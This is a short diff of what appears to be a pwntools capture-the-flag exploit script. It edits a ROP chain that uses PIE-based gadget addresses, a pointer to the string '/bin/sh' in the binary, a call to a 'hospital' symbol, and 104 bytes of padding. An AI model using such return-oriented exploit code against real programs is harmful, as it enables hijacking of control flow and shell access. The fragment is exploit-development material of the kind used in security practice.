@@ -44,10 +44,11 @@ chain = [
     pie_base + rop.rsi.address,
     0xdeadb33f,
     pie_base + rop.rdx.address,
-    0x413a53,
+    next(exe.search(b"/bin/sh")),
     pie_base + rop.ret.address,
     exe.symbols["hospital"]
 ]
+info([hex(a) for a in chain])
 chain = b"".join([p64(a) for a in chain])
 
 padding = 13 * 8 * b"A"
